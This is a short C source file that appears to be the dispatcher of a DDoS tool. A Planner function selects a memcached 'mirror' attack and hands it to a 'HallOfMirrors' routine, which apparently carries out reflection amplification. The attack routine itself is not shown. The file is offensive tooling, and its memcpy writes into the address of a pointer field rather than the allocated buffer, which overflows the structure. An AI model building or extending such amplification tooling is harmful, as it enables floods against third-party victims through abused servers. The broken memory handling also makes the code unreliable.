#include "venus.h"
#include "commander/planner.h"
#include "commander/hom.h"

static void _fatalHandler()
{

}

LhfPlan * Planner( LhfDraft p_draft )
{
    LhfPlan *plan = NULL;

    memalloc(&plan, sizeof(LhfPlan));
    memalloc(&(plan->atkData), sizeof(LhfDraft));

    switch (p_draft.atkId)
    {
      case MEMCACHED:
        plan->mirrorId = MEMCACHED;
        memcpy(&(plan->atkData), &p_draft, sizeof(LhfDraft));
        plan->atk_cmd = ExecuteMemcachedAttack;
        break;
      default:
        break;
        //Default attack
    }

    return plan;
}

void LhfStartCtr( LhfDraft p_draft)
{
  
  LhfPlan *plan = NULL;

  signal(SIGABRT, _fatalHandler);

  plan = Planner( p_draft );

  HallOfMirrors( plan );
}
